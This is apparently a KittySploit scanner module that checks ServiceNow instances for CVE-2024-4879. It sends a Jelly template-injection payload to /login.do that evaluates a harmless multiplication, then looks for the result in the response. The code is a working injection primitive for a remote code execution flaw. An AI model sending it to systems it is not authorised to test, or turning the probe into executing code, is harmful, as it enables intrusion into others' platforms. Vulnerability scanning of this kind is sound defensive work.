#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ServiceNow has addressed an input validation vulnerability that was identified in Vancouver and Washington DC ."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ServiceNow UI Macros - Template Injection Detection',
        'description': 'ServiceNow has addressed an input validation vulnerability that was identified in Vancouver and Washington DC Now Platform releases. This vulnerability could enable an unauthenticated user to remotely execute code within the context of the Now Platform. ServiceNow applied an update to hosted instances, and ServiceNow released the update to our partners and self-hosted customers. Listed below are the patches and hot fixes that address the vulnerability. If you have not done so already, we recommend applying security patches relevant to your instance as soon as possible.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'servicenow', 'ssti', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.assetnote.io/resources/research/chaining-three-bugs-to-access-all-your-servicenow-data',
            'https://support.servicenow.com/kb?id=kb_article_view&sysparm_article=KB1644293',
            'https://support.servicenow.com/kb?id=kb_article_view&sysparm_article=KB1645154',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-4879',
        ],
        'cve': 'CVE-2024-4879',
    }

    def run(self):
        path = '/login.do?jvar_page_title=<style><j:jelly%20xmlns:j="jelly"%20xmlns:g=%27glide%27><g:evaluate>gs.addErrorMessage(1337*1337);</g:evaluate></j:jelly></style>'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<div class="outputmsg_text">1787569</div>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='critical', reason='ServiceNow UI Macros - Template Injection detected', path=path)
            return True
        return False

